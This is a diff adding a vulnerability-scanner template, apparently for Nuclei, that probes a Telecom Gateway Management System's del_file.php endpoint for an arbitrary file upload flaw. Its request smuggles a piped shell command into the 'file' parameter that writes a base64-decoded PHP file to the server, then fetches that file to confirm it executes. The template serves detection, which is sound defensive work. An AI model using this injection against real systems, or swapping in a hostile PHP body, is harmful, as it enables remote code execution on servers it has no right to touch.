@@ -1,0 +1,40 @@
+id: telecom-gateway-del-file-php-anyfile-upload
+info:
+  name: Telecom Gateway Management System del_file.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the Telecom Gateway Management System via the del_file.php endpoint.
+
+variables:
+  t1: "{{rand_base(3)}}"
+  t2: "{{base64(concat('<?php echo ', t1, '; ?>'))}}"
+
+http:
+  - id: initial-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/manager/newtpl/del_file.php?file=1.txt%7Cecho%20{{t2}}%20%7C%20base64%20-d%20%3E%20{{t1}}.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/manager/newtpl/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{t1}}"
+        part: body
